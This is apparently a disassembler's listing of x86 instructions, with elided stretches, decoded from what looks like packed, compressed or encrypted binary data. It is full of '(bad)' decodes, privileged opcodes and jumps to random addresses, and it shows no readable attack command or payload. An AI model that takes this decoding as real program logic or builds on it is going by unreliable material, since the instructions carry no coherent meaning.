  41a87d:	mov    ebp,0x6e336743
  41a882:	inc    ebp
  41a883:	test   dl,bh
  41a885:	cmp    edx,DWORD PTR [ecx+0x38b620a9]
  41a88b:	mov    al,0x16
  41a88d:	sub    DWORD PTR [edx+0x3b845d61],ebp
  41a893:	and    BYTE PTR [edi],dh
  41a895:	add    al,BYTE PTR [ebp+esi*2-0x537a585d]
  41a89c:	pop    ebx
  41a89d:	imul   esp,ebx,0x4c
  41a8a0:	push   0x1e
  41a8a2:	ins    DWORD PTR es:[edi],dx
  41a8a3:	add    al,0xd
  41a8a5:	std    
  41a8a6:	fidiv  DWORD PTR [ebp-0x3b]
  41a8a9:	mov    eax,ds:0x80c02211
  41a8ae:	sub    bl,BYTE PTR [esi*2+0x2faecb2e]
	...
  41a915:	add    BYTE PTR ds:0xcf4a867e,dh
  41a91b:	cli    
  41a91c:	std    
  41a91d:	jg     0x41a90a
  41a91f:	mov    ds:0x596b323e,al
  41a924:	cs hlt 
  41a926:	ficom  WORD PTR [edi]
  41a928:	add    DWORD PTR [eax],eax
  41a92a:	pop    es
  41a92b:	add    DWORD PTR [eax],eax
  41a92d:	add    BYTE PTR [edx],dh
  41a92f:	xchg   ebx,eax
  41a930:	lods   al,BYTE PTR ds:[esi]
  41a931:	mov    ch,0xe3
  41a933:	sub    ch,bh
  41a935:	les    edx,FWORD PTR [ebx-0x64]
  41a938:	aam    0x57
  41a93a:	xchg   ecx,eax
  41a93b:	gs out 0xa6,al
  41a93e:	lods   eax,DWORD PTR ds:[esi]
  41a93f:	rcr    BYTE PTR [edi],0xd2
  41a942:	jmp    0x5784:0x2d13a8c3
  41a949:	mov    ebp,0x90eb7eff
  41a94e:	les    ebx,FWORD PTR [edi+0x43c98de6]
  41a954:	mov    eax,DWORD PTR [ebp+0x7840d8d0]
  41a95a:	pusha  
  41a95b:	mov    al,ds:0x9507cf92
  41a960:	aaa    
  41a961:	lock jg 0x41a95d
  41a964:	add    esi,DWORD PTR ds:0xaed37b9e
  41a96a:	jo     0x41a901
  41a96c:	xchg   DWORD PTR [esp+edi*2-0x1fadef32],edi
  41a973:	adc    al,0x69
  41a975:	or     ah,BYTE PTR [ecx]
  41a977:	and    BYTE PTR [edx],bh
  41a979:	loopne 0x41a92c
  41a97b:	adc    edx,DWORD PTR [ebp-0x7be06224]
  41a981:	xchg   ecx,eax
  41a982:	in     eax,dx
  41a983:	fistp  WORD PTR [eax-0x58]
  41a986:	js     0x41a916
  41a988:	icebp  
  41a989:	sub    al,0x9c
  41a98b:	dec    edi
  41a98c:	jb     0x41a957
  41a98e:	sbb    DWORD PTR [esi+0x2],eax
  41a991:	add    bh,0xdb
  41a994:	fdiv   DWORD PTR [ecx]
  41a996:	cmc    
  41a997:	repnz cld 
  41a999:	aam    0xd9
  41a99b:	mov    dl,dh
  41a99d:	data16 div BYTE PTR ds:0xf29ae950
  41a9a4:	add    edi,esp
  41a9a6:	rcl    esp,1
  41a9a8:	inc    ecx
  41a9a9:	imul   ebx,DWORD PTR [esi-0x7f],0x65
  41a9ad:	sbb    al,0xe6
  41a9af:	cmc    
  41a9b0:	pop    esi
  41a9b1:	adc    eax,0xfdd9f358
  41a9b6:	mov    bh,0x7
  41a9b8:	or     al,0x42
  41a9ba:	rol    BYTE PTR [edi+0x19],1
  41a9bd:	jg     0x41a95f
  41a9bf:	in     eax,dx
  41a9c0:	mov    cs:0x775848e9,al
  41a9c6:	popa   
  41a9c7:	shr    ch,0x69
  41a9ca:	mov    al,ds:0x973e2e5
  41a9cf:	inc    ebx
  41a9d0:	jns    0x41a9e6
  41a9d2:	jge    0x41a9f5
  41a9d4:	mov    eax,ds:0xcd6d3a71
  41a9d9:	leave  
  41a9da:	dec    edx
  41a9db:	cs mov edx,0x833b3817
  41a9e1:	mov    dl,0xa0
  41a9e3:	cmp    BYTE PTR [edx-0x2b],ah
  41a9e6:	ja     0x41aa12
  41a9e8:	jge    0x41a97e
  41a9ea:	(bad)  
  41a9eb:	(bad)  
  41a9ec:	outs   dx,BYTE PTR ds:[esi]
  41a9ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9ee:	sbb    cl,BYTE PTR [edx-0x3b]
  41a9f1:	mov    bl,0x64
  41a9f3:	mov    bh,0x76
  41a9f5:	call   0x7eb881ef
  41a9fa:	leave  
  41a9fb:	repnz xchg esp,eax
  41a9fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9fe:	push   ebx
  41a9ff:	dec    esp
  41aa00:	sbb    dl,BYTE PTR [eax-0x8d0d7df]
  41aa06:	add    al,0x43
  41aa08:	ss jl  0x41aa02
  41aa0b:	sbb    BYTE PTR [esi+edx*1-0x54],ah
  41aa0f:	lahf   
  41aa10:	jne    0x41a9bb
  41aa12:	cmc    
  41aa13:	xchg   esp,eax
  41aa14:	cli    
  41aa15:	jmp    0x41aa58
  41aa17:	mov    al,0x40
  41aa19:	lods   al,BYTE PTR ds:[esi]
  41aa1a:	cwde   
  41aa1b:	outs   dx,BYTE PTR ds:[esi]
  41aa1c:	sbb    dl,BYTE PTR [edi-0x56bd18d5]
  41aa22:	adc    BYTE PTR [ebx],ah
  41aa24:	js     0x41a9c1
  41aa26:	cmc    
  41aa27:	lods   al,BYTE PTR ds:[esi]
  41aa28:	pop    ds
  41aa29:	aaa    
  41aa2a:	popf   
  41aa2b:	push   esp
  41aa2c:	inc    esp
  41aa2d:	mov    ecx,DWORD PTR [ecx+0x43fd1894]
  41aa33:	jb     0x41aa2c
	...
  41aa95:	add    bh,dh
  41aa97:	add    esp,ebx
  41aa99:	mov    ah,0xfe
  41aa9b:	std    
  41aa9c:	inc    DWORD PTR [ebx-0x4b]
  41aa9f:	mov    ds:0x5f56e277,al
  41aaa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aaa5:	hlt    
  41aaa6:	in     eax,0x18
  41aaa8:	add    DWORD PTR [eax],eax
  41aaaa:	pop    es
  41aaab:	add    DWORD PTR [eax],eax
  41aaad:	add    BYTE PTR [edx-0x2c2e88d3],dl
  41aab3:	sahf   
  41aab4:	jae    0x41aa5d
  41aab6:	dec    edx
  41aab7:	adc    esi,DWORD PTR [edi]
  41aab9:	out    dx,eax
  41aaba:	xor    ebp,esi
  41aabc:	repnz inc esi
  41aabe:	aad    0x57
  41aac0:	imul   BYTE PTR [edi+edx*1]
  41aac3:	sahf   
  41aac4:	jne    0x41aa61
  41aac6:	pop    eax
  41aac7:	comiss xmm6,xmm4
  41aaca:	call   0xb360:0x4be7d106
  41aad1:	sahf   
  41aad2:	xchg   bh,dh
  41aad4:	cmp    al,0xe0
  41aad6:	mov    cl,0xc0
  41aad8:	js     0x41ab2a
  41aada:	sbb    eax,esi
  41aadc:	sub    eax,0xa7ad4361
  41aae1:	adc    eax,0x58139ce9
  41aae6:	cmp    eax,0xb3e7b3cd
  41aaeb:	jl     0x41ab1b
  41aaed:	sar    esi,cl
  41aaef:	retf   
  41aaf0:	pushf  
  41aaf1:	pushf  
  41aaf2:	cs lahf 
  41aaf4:	sub    al,0xb8
  41aaf6:	int    0xc1
  41aaf8:	cmc    
  41aaf9:	mov    eax,DWORD PTR gs:[ebp-0x80]
  41aafd:	es xor eax,0x8ad268b3
  41ab03:	jp     0x41ab1a
  41ab05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab06:	nop
  41ab07:	lahf   
  41ab08:	das    
  41ab09:	ins    DWORD PTR es:[edi],dx
  41ab0a:	jmp    DWORD PTR [edx-0x45]
  41ab0d:	or     al,bl
  41ab0f:	add    dh,bl
  41ab11:	pop    edi
  41ab12:	push   ds
  41ab13:	mov    ds:0xa2a852f8,al
  41ab18:	fdiv   QWORD PTR cs:[edx+ecx*2+0x779dd797]
  41ab20:	mov    BYTE PTR [edi],bl
  41ab22:	clc    
  41ab23:	call   0x30e9a79f
  41ab28:	adc    al,0x73
  41ab2a:	in     al,0xa2
  41ab2c:	dec    esi
  41ab2d:	xchg   edi,eax
  41ab2e:	pop    ebx
  41ab2f:	mov    esp,0xf47c5720
  41ab34:	ds push 0xfffffff9
  41ab37:	mov    al,0xc3
  41ab39:	aaa    
  41ab3a:	in     eax,0xe0
  41ab3c:	and    al,0x74
  41ab3e:	fwait
  41ab3f:	pop    edi
  41ab40:	lods   al,BYTE PTR ds:[esi]
  41ab41:	mov    cl,0x8c
  41ab43:	push   0x8a809ae4
  41ab48:	jb     0x41ab95
  41ab4a:	je     0x41ab10
  41ab4c:	lea    ecx,[esi]
  41ab4e:	loope  0x41ab50
  41ab50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab51:	stos   BYTE PTR es:[edi],al
  41ab52:	add    al,0x37
  41ab54:	leave  
  41ab55:	xlat   BYTE PTR ds:[ebx]
  41ab56:	dec    esp
  41ab57:	mov    eax,ds:0x1e8e847
  41ab5c:	sbb    al,0x31
  41ab5e:	push   ss
  41ab5f:	push   ds
  41ab60:	xchg   edx,eax
  41ab61:	dec    eax
  41ab62:	sub    eax,ebp
  41ab64:	sub    esi,edx
  41ab66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab67:	fst    DWORD PTR [edx]
  41ab69:	inc    esi
  41ab6a:	mov    ecx,0xd6e76965
  41ab6f:	add    edx,esp
  41ab71:	mov    ?,WORD PTR [edi]
  41ab73:	stc    
  41ab74:	dec    esi
  41ab75:	mov    WORD PTR [esi-0x1e],ss
  41ab78:	loopne 0x41ab65
  41ab7a:	les    esp,FWORD PTR [edi]
  41ab7c:	sub    dl,BYTE PTR [ecx+ecx*8-0x39]
  41ab80:	mov    ?,WORD PTR [eax+ebx*1]
  41ab83:	dec    esp
  41ab84:	ins    BYTE PTR es:[edi],dx
  41ab85:	mov    edx,0x86a3d844
  41ab8a:	mov    cl,0xaa
  41ab8c:	sbb    al,ch
  41ab8e:	mov    DWORD PTR [ebp+0x5b8bbfdf],ebx
  41ab94:	jp     0x41ac0f
  41ab96:	inc    ebx
  41ab97:	jb     0x41ab68
  41ab99:	xor    al,0xf0
  41ab9b:	jns    0x41abfe
  41ab9d:	loope  0x41ac17
  41ab9f:	stc    
  41aba0:	adc    dl,dh
  41aba2:	in     eax,0xf8
  41aba4:	sbb    DWORD PTR [esp+edi*8+0x3d],ebp
  41aba8:	mov    al,dh
  41abaa:	(bad)  
  41abab:	fdiv   DWORD PTR [ebx+0x1f]
  41abae:	loop   0x41ab39
  41abb0:	pop    edx
  41abb1:	iret   
  41abb2:	aaa    
  41abb3:	jle    0x41abc7
	...
  41ac15:	add    BYTE PTR [edx+0x49],ch
  41ac18:	es cmp al,0x27
  41ac1b:	jg     0x41ac97
  41ac1d:	pop    edi
  41ac1e:	pop    esp
  41ac1f:	mov    edx,0xadc6cc53
  41ac24:	and    BYTE PTR [ebp+0x119ec],ah
  41ac2a:	pop    es
  41ac2b:	add    DWORD PTR [eax],eax
  41ac2d:	add    BYTE PTR [edx],cl
  41ac2f:	jp     0x41ac3d
  41ac31:	mov    dl,0x93
  41ac33:	aad    0x5b
  41ac35:	loop   0x41ac99
  41ac37:	jl     0x41abfd
  41ac39:	dec    ecx
  41ac3a:	ret    0x5eff
  41ac3d:	mov    ah,0xee
  41ac3f:	add    al,0xec
  41ac41:	adc    esp,DWORD PTR [edi]
  41ac43:	sahf   
  41ac44:	fild   DWORD PTR [edi+0x2c]
  41ac47:	fild   DWORD PTR [edx]
  41ac49:	bound  eax,QWORD PTR [ebp-0x5a]
  41ac4c:	fnsave [ebx]
  41ac4e:	ins    BYTE PTR es:[edi],dx
  41ac4f:	push   esi
  41ac50:	inc    edx
  41ac51:	mov    esp,0x28ae3e77
  41ac56:	mov    BYTE PTR [ebp-0x75],al
  41ac59:	cld    
  41ac5a:	push   es
  41ac5b:	xlat   BYTE PTR ds:[ebx]
  41ac5c:	inc    esi
  41ac5d:	jmp    0x41ac02
  41ac5f:	mov    dl,dh
  41ac61:	adc    BYTE PTR [esp+ebx*8+0x626f9a1c],dl
  41ac68:	rcr    DWORD PTR [edi-0x3e],1
  41ac6b:	add    eax,0xa73c15c0
  41ac70:	sbb    eax,0x83031848
  41ac75:	adc    al,0x33
  41ac77:	mov    edx,0x35881cb6
  41ac7c:	sbb    eax,0xfd45fe4f
  41ac81:	stos   DWORD PTR es:[edi],eax
  41ac82:	mov    ds:0x8d27c5a,al
  41ac87:	(bad)  
  41ac88:	in     al,0x21
  41ac8a:	in     eax,0xf4
  41ac8c:	or     esp,DWORD PTR [ecx-0x36]
  41ac8f:	rcr    ch,0xb7
  41ac92:	sub    ecx,edx
  41ac94:	out    0xa3,al
  41ac96:	sub    BYTE PTR [edi-0x12a9b099],bh
  41ac9c:	ja     0x41ac1f
  41ac9e:	aaa    
  41ac9f:	(bad)  
  41aca0:	in     al,dx
  41aca1:	mov    ch,0x58
  41aca3:	ror    bh,0x7e
  41aca6:	sbb    esp,DWORD PTR [edx*8-0x24e37351]
  41acad:	aaa    
  41acae:	scas   al,BYTE PTR es:[edi]
  41acaf:	and    eax,0x35d44b7e
  41acb4:	push   edi
  41acb5:	(bad)  
  41acb6:	f2xm1  
  41acb8:	xchg   edi,eax
  41acb9:	mov    eax,ds:0xcdc7e24d
  41acbe:	push   eax
  41acbf:	xor    eax,0xb64140fd
  41acc4:	sbb    dh,BYTE PTR [esi+0x24ae5f94]
  41acca:	lahf   
  41accb:	std    
  41accc:	shl    BYTE PTR [eax+edx*8-0x33],1
  41acd0:	aas    
  41acd1:	lods   al,BYTE PTR ds:[esi]
  41acd2:	fnstsw WORD PTR [eax+0xae9cb58]
  41acd8:	loopne 0x41ac8f
  41acda:	ret    
  41acdb:	gs gs sbb eax,0x18ce0afa
  41ace2:	xchg   DWORD PTR [bx+si-0x5179],ebp
  41ace7:	jne    0x41ac90
  41ace9:	test   eax,0x6cbf3e18
  41acee:	fbld   TBYTE PTR [edi-0x34]
  41acf1:	fwait
  41acf2:	out    dx,al
  41acf3:	jo     0x41acd6
  41acf5:	fidiv  WORD PTR [edx]
  41acf7:	push   ebp
  41acf8:	pop    edi
  41acf9:	out    0xba,eax
  41acfb:	aaa    
  41acfc:	mov    ah,0x31
  41acfe:	pop    edi
  41acff:	in     eax,0xd3
  41ad01:	mov    dh,0x67
  41ad03:	(bad)  
  41ad04:	enter  0xe4d,0xb8
  41ad08:	adc    BYTE PTR [edx-0x7d],0x4c
  41ad0c:	push   ds
  41ad0d:	(bad)  
  41ad0e:	jge    0x41acd1
  41ad10:	in     al,dx
  41ad11:	cld    
  41ad12:	test   bh,dh
  41ad14:	jp     0x41acfb
  41ad16:	sbb    ch,BYTE PTR [ebx-0x6b]
  41ad19:	lods   al,BYTE PTR ds:[esi]
  41ad1a:	xor    cl,BYTE PTR [ebx+0x359c7900]
  41ad20:	in     eax,dx
  41ad21:	icebp  
  41ad22:	jge    0x41ad27
  41ad24:	adc    BYTE PTR [edx-0x26],0x1d
  41ad28:	xor    BYTE PTR ds:0x723e219,al
  41ad2e:	scas   al,BYTE PTR es:[edi]
  41ad2f:	idiv   DWORD PTR [eax+0x10]
  41ad32:	jl     0x41ad43
  41ad34:	fild   DWORD PTR [eax]
	...
  41ad96:	push   ebp
  41ad97:	clc    
  41ad98:	or     DWORD PTR [esi-0x4280053],ebx
  41ad9e:	mov    dh,BYTE PTR [eax+eax*4]
  41ada1:	add    ecx,DWORD PTR [eax+ecx*4+0x1af3e4c6]
  41ada8:	add    DWORD PTR [eax],eax
  41adaa:	pop    es
  41adab:	add    DWORD PTR [eax],eax
  41adad:	add    bh,cl
  41adaf:	fwait
  41adb0:	lods   al,BYTE PTR ds:[esi]
  41adb1:	in     eax,dx
  41adb2:	or     eax,0x697cdac2
  41adb7:	(bad)  
  41adb9:	mov    ebp,0x139d8a46
  41adbe:	inc    edi
  41adbf:	inc    esi
  41adc0:	jb     0x41ae19
  41adc2:	xchg   BYTE PTR [ebp+0x171b0531],dl
  41adc8:	mov    ds:0x6c56adb3,al
  41adcd:	pop    ecx
  41adce:	sti    
  41adcf:	xchg   ebx,eax
  41add0:	xor    edx,eax
  41add2:	les    edx,FWORD PTR [edx-0x46fdd992]
  41add8:	cmp    al,0xe9
  41adda:	sub    ah,bl
  41addc:	ficomp DWORD PTR [eax]
  41adde:	cmp    DWORD PTR [eax-0x6c],edx
  41ade1:	sbb    ch,BYTE PTR [edx]
  41ade3:	or     ebx,DWORD PTR [edx-0x6]
  41ade6:	adc    al,BYTE PTR ss:[ecx*2-0x2de8d080]
  41adee:	shl    DWORD PTR [eax+eax*1],0xe1
  41adf2:	pop    es
  41adf3:	pushf  
  41adf4:	add    bh,bh
  41adf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adf7:	inc    esp
  41adf8:	fiadd  WORD PTR [edx-0x2c]
  41adfb:	pusha  
  41adfc:	mov    dl,0x1f
  41adfe:	stos   BYTE PTR es:[edi],al
  41adff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae00:	add    DWORD PTR [ebx],0xffffffa4
  41ae03:	and    edx,DWORD PTR [edx+0x9]
  41ae06:	pop    es
  41ae07:	sbb    BYTE PTR [ebx+0x4d],cl
  41ae0a:	push   edi
  41ae0b:	mov    ch,0x54
  41ae0d:	jecxz  0x41ae34
  41ae0f:	test   BYTE PTR [edx-0x20480ad3],ah
  41ae15:	enter  0xa327,0x55
  41ae19:	(bad)  
  41ae1a:	(bad)  [edx-0x6ea25acc]
  41ae20:	or     dh,dh
  41ae22:	(bad)  
  41ae23:	xor    DWORD PTR [ebx+ecx*8-0x5f06e478],eax
  41ae2a:	xor    al,ch
  41ae2c:	or     eax,0xbab3fac
  41ae31:	and    edx,DWORD PTR [esi]
  41ae33:	dec    esi
  41ae34:	test   al,0x6e
  41ae36:	cmp    BYTE PTR [eax-0x50d89f4b],bl
  41ae3c:	add    eax,0x7c5d0870
  41ae41:	mov    dh,0xbf
  41ae43:	stos   BYTE PTR es:[edi],al
  41ae44:	or     DWORD PTR ds:0xc1ed0917,0xffffffc1
  41ae4b:	mov    ebx,0x46edf8b3
  41ae50:	cmp    al,0xc8
  41ae52:	fldcw  WORD PTR [esi]
  41ae54:	inc    edx
  41ae55:	jnp    0x41ae10
  41ae57:	not    BYTE PTR [eax-0x52]
  41ae5a:	jb     0x41ae0d
  41ae5c:	rcl    ecx,cl
  41ae5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae5f:	outs   dx,DWORD PTR ds:[esi]
  41ae60:	cld    
  41ae61:	idiv   eax
  41ae63:	xchg   esp,eax
  41ae64:	pushf  
  41ae65:	jno    0x41ae6e
  41ae67:	call   0x1e2bcfb1
  41ae6c:	test   ah,dh
  41ae6e:	and    DWORD PTR [ebx],edx
  41ae70:	push   eax
  41ae71:	repz aas 
  41ae73:	sbb    eax,0x75a60b35
  41ae78:	xor    al,0x91
  41ae7a:	push   ds
  41ae7b:	xchg   ebp,eax
  41ae7c:	ds (bad) 
  41ae7e:	fist   DWORD PTR [esi-0xbcfb38b]
  41ae84:	mov    al,ds:0x6420cde2
  41ae89:	dec    edi
  41ae8a:	repz inc edi
  41ae8c:	mov    ebx,0x855e7449
  41ae91:	push   edx
  41ae92:	test   al,0xdb
  41ae94:	push   ds
  41ae95:	jo     0x41ae4f
  41ae97:	aaa    
  41ae98:	mov    eax,0x22b29088
  41ae9d:	jp     0x41ae43
  41ae9f:	lahf   
  41aea0:	xchg   ebp,eax
  41aea1:	adc    eax,0x3b196d89
  41aea6:	mov    ds:0x35caabe3,eax
  41aeab:	mov    edx,DWORD PTR [edx-0x62675312]
  41aeb1:	cmp    edx,ebx
  41aeb3:	mov    bl,0x36
	...
  41af15:	add    ch,al
  41af17:	stc    
  41af18:	lods   eax,DWORD PTR ds:[esi]
  41af19:	xor    edi,DWORD PTR [ebp+0x56ffdf77]
  41af1f:	xor    al,0x39
  41af21:	loop   0x41af1c
  41af23:	pop    esi
  41af24:	jg     0x41aee2
  41af26:	cli    
  41af27:	sbb    eax,DWORD PTR [ecx]
  41af29:	add    BYTE PTR [edi],al
  41af2b:	add    DWORD PTR [eax],eax
  41af2d:	add    BYTE PTR [edi-0x23],dl
  41af30:	inc    ebx
  41af31:	scas   al,BYTE PTR es:[edi]
  41af32:	nop
  41af33:	(bad)  
  41af34:	mov    eax,0x19ff1629
  41af39:	sub    BYTE PTR [edi-0x3d7d8593],cl
  41af3f:	test   esi,edx
  41af41:	mov    dl,0xa1
  41af43:	bound  ecx,QWORD PTR [edi]
  41af45:	int3   
  41af46:	dec    ecx
  41af47:	push   eax
  41af48:	popf   
  41af49:	mov    dl,0x70
  41af4b:	hlt    
  41af4c:	jle    0xf5c3437a
  41af52:	sti    
  41af53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af54:	lds    esp,FWORD PTR [esi+0x20]
  41af57:	div    edi
  41af59:	jl     0x41af66
  41af5b:	pop    ebp
  41af5c:	push   ebp
  41af5d:	stc    
  41af5e:	adc    bh,bh
  41af60:	adc    ebp,DWORD PTR [edi-0x3a]
  41af63:	lods   eax,DWORD PTR ds:[esi]
  41af64:	mov    al,0x77
  41af66:	(bad)  [si+0x7523]
  41af6b:	xor    edx,esi
  41af6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af6e:	pop    eax
  41af6f:	shl    BYTE PTR [ecx],1
  41af71:	fadd   DWORD PTR [edi+0x3]
  41af74:	inc    ebx
  41af75:	push   edi
  41af76:	fld    QWORD PTR [esi-0x65517b01]
  41af7c:	nop
  41af7d:	aaa    
  41af7e:	sbb    BYTE PTR [edx+0x78],bh
  41af81:	jae    0x41af5b
  41af83:	sbb    eax,0x2b24a12e
  41af88:	xchg   esp,eax
  41af89:	ins    BYTE PTR es:[edi],dx
  41af8a:	push   edi
  41af8b:	mov    eax,ds:0x3f1fc185
  41af90:	out    0x86,al
  41af92:	int    0xa7
  41af94:	dec    ebx
  41af95:	push   es
  41af96:	adc    BYTE PTR [edx+0x63],0x72
  41af9a:	jno    0x41af65
  41af9c:	push   edi
  41af9d:	fwait
  41af9e:	mov    al,ds:0x36fba060
  41afa3:	push   cs
  41afa4:	mov    ah,0xa5
  41afa6:	aas    
  41afa7:	or     al,0xb
  41afa9:	enter  0x3b1f,0x12
  41afad:	mov    BYTE PTR [esi],al
  41afaf:	shl    BYTE PTR [ebx+0x48],cl
  41afb2:	mov    ah,bh
  41afb4:	xor    DWORD PTR fs:0x6a77c2,ebp
  41afbb:	xor    esi,DWORD PTR [edi]
  41afbd:	adc    al,0x59
  41afbf:	(bad)  
  41afc0:	rcr    BYTE PTR [eax-0x3d],1
  41afc3:	into   
  41afc4:	inc    esp
  41afc5:	pushf  
  41afc6:	fwait
  41afc7:	outs   dx,BYTE PTR ds:[esi]
  41afc8:	dec    ebp
  41afc9:	shl    BYTE PTR [eax],1
  41afcb:	cs icebp 
  41afcd:	cmp    DWORD PTR [ebx-0x1422ce72],ecx
  41afd3:	test   eax,0x4f338eb2
  41afd8:	jg     0x41afda
  41afda:	mov    edi,0x3fddef2e
  41afdf:	push   edx
  41afe0:	jnp    0x41af99
  41afe2:	sbb    eax,0x394673dd
  41afe7:	stos   BYTE PTR es:[edi],al
  41afe8:	ds sbb ebp,ebx
  41afeb:	jl     0x41af97
  41afed:	mov    ch,0xb7
  41afef:	xor    ebp,ecx
  41aff1:	or     ecx,DWORD PTR [ebp-0x1]
  41aff4:	jmp    0x90e4bbad
  41aff9:	jmp    0x41b02c
  41affb:	pop    esp
  41affc:	xchg   edx,eax
  41affd:	out    0x22,al
  41afff:	jbe    0x41b006
  41b001:	jmp    0x41afc0
  41b003:	inc    ebx
  41b004:	call   0x9750:0x81d4806c
  41b00b:	pop    ss
  41b00c:	outs   dx,BYTE PTR ds:[esi]
  41b00d:	retf   0xee05
  41b010:	lods   al,BYTE PTR ds:[esi]
  41b011:	mov    ss,WORD PTR [eax-0x58]
  41b014:	out    dx,eax
  41b015:	xchg   esi,eax
  41b016:	dec    ecx
  41b017:	jmp    0xeea185ed
  41b01c:	jae    0x41b048
  41b01e:	cdq    
  41b01f:	dec    esi
  41b020:	ficomp WORD PTR [ecx-0x4c]
  41b023:	es jae 0x41b070
  41b026:	dec    edx
  41b027:	cli    
  41b028:	cdq    
  41b029:	dec    ebp
  41b02a:	cmp    ebx,DWORD PTR ds:0x7fe3f54
  41b030:	fmul   QWORD PTR [ecx]
  41b032:	lahf   
  41b033:	push   ebx
  41b034:	aaa    
	...
  41b095:	add    dh,al
  41b097:	ficom  WORD PTR [eax]
  41b099:	stos   DWORD PTR es:[edi],eax
  41b09a:	sbb    bh,ch
  41b09c:	(bad)  
  41b09d:	jmp    DWORD PTR [eax]
  41b09f:	jmp    FWORD PTR [esi-0x3afe12cf]
  41b0a5:	jae    0x41b0a8
  41b0a7:	sbb    eax,0x1070001
  41b0ac:	add    BYTE PTR [eax],al
  41b0ae:	mov    eax,0x672f2443
  41b0b3:	sub    al,BYTE PTR [ebp-0x3a]
  41b0b6:	repnz neg DWORD PTR [esi-0x2]
  41b0ba:	fwait
  41b0bb:	push   eax
  41b0bc:	jge    0x41b133
  41b0be:	mov    edi,0x2f89b50f
  41b0c3:	pushf  
  41b0c4:	jo     0x41b10c
  41b0c6:	and    eax,0x2e400fa2
  41b0cb:	dec    ecx
  41b0cc:	push   ebx
  41b0cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0ce:	xor    eax,0x4568487e
  41b0d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0d4:	imul   esi,DWORD PTR [edi],0xa6a3d82d
  41b0da:	fwait
  41b0db:	adc    DWORD PTR [esi-0x7b44144c],eax
  41b0e1:	pop    esi
  41b0e2:	dec    edx
  41b0e3:	mov    bl,0xef
  41b0e5:	stos   DWORD PTR es:[edi],eax
  41b0e6:	jno    0x41b157
  41b0e8:	mov    edi,?
  41b0ea:	gs dec eax
  41b0ec:	out    dx,eax
  41b0ed:	adc    al,0x4a
  41b0ef:	xchg   ecx,eax
  41b0f0:	cld    
  41b0f1:	bswap  edi
  41b0f3:	lods   eax,DWORD PTR ds:[esi]
  41b0f4:	mov    BYTE PTR [eax],dh
  41b0f6:	pop    ecx
  41b0f7:	jns    0x41b158
  41b0f9:	inc    esp
  41b0fa:	rol    DWORD PTR [edi+0x66],1
  41b0fd:	adc    BYTE PTR [edi+edi*2],al
  41b100:	mov    bl,0xa6
  41b102:	xchg   edi,eax
  41b103:	jae    0x41b0f2
  41b105:	add    eax,0x196b2166
  41b10a:	mov    ds:0xad889b89,eax
  41b10f:	dec    edx
  41b110:	aam    0x45
  41b112:	cs mov bl,0x79
  41b115:	xchg   esi,eax
  41b116:	xchg   ecx,eax
  41b117:	fnstenv [edi+ebp*8+0x72]
  41b11b:	stos   BYTE PTR es:[edi],al
  41b11c:	shl    DWORD PTR [ebp+0x22d24353],cl
  41b122:	jp     0x41b0f4
  41b124:	sbb    BYTE PTR [edx-0x36],0xe5
  41b128:	vaddps ymm7,ymm1,ymm6
  41b12c:	or     ecx,DWORD PTR [edi-0x2d]
  41b12f:	add    esi,DWORD PTR [edi+0x32]
  41b132:	imul   ecx,DWORD PTR [edx+eax*1-0x2d9b8b0],0x2fdbfcc9
  41b13d:	imul   ecx,DWORD PTR [ebp-0x43],0x675d7430
  41b144:	arpl   WORD PTR [edx],bp
  41b146:	les    eax,FWORD PTR [ebx-0x80]
  41b149:	xchg   ebx,eax
  41b14a:	ins    DWORD PTR es:[edi],dx
  41b14b:	arpl   WORD PTR [esi],ax
  41b14d:	(bad)  
  41b14e:	fucomp st(4)
  41b150:	mov    ds:0xe1c55bf0,eax
  41b155:	jge    0x41b15a
  41b157:	inc    eax
  41b158:	int3   
  41b159:	in     eax,dx
  41b15a:	scas   al,BYTE PTR es:[edi]
  41b15b:	loope  0x41b179
  41b15d:	repnz mov BYTE PTR [eax-0x43],0x30
  41b162:	out    dx,al
  41b163:	pop    esp
  41b164:	int3   
  41b165:	push   ebp
  41b166:	xchg   ecx,eax
  41b167:	push   esp
  41b168:	push   edx
  41b169:	outs   dx,DWORD PTR ds:[esi]
  41b16a:	mov    al,ds:0xa11b7d6d
  41b16f:	mov    esp,0xcffb81a7
  41b174:	aaa    
  41b175:	aad    0xcb
  41b177:	pusha  
  41b178:	dec    bp
  41b17a:	rcr    DWORD PTR [eax-0x661fd86c],1
  41b180:	sub    eax,0x182ad591
  41b186:	mov    eax,ds:0xc7a04c45
  41b18b:	sbb    ah,BYTE PTR [ebx+0x21]
  41b18e:	xlat   BYTE PTR ds:[ebx]
  41b18f:	adc    al,0xf2
  41b191:	mov    eax,DWORD PTR [edx+edx*1]
  41b194:	mov    ebx,0xd87d04fb
  41b199:	and    cl,ch
  41b19b:	in     eax,0x24
  41b19d:	aaa    
  41b19e:	jo     0x41b1d7
  41b1a0:	lods   eax,DWORD PTR ds:[esi]
  41b1a1:	inc    ebx
  41b1a2:	loop   0x41b206
  41b1a4:	fcom   DWORD PTR [esi-0x32]
  41b1a7:	lods   eax,DWORD PTR ds:[esi]
  41b1a8:	add    dh,ah
  41b1aa:	inc    ecx
  41b1ab:	int    0x93
  41b1ad:	jne    0x41b15f
  41b1af:	jae    0x41b14f
  41b1b1:	sbb    bh,BYTE PTR [edi]
  41b1b3:	popa   
  41b1b4:	fwait
	...
  41b215:	add    BYTE PTR [esi+0x6be069a5],cl
  41b21b:	in     al,dx
  41b21c:	(bad)  
  41b21d:	out    dx,eax
  41b21e:	arpl   WORD PTR [edi-0x53],sp
  41b221:	aas    
  41b222:	in     al,dx
  41b223:	xchg   DWORD PTR [ecx+0x2],edx
  41b226:	or     BYTE PTR [esi],bl
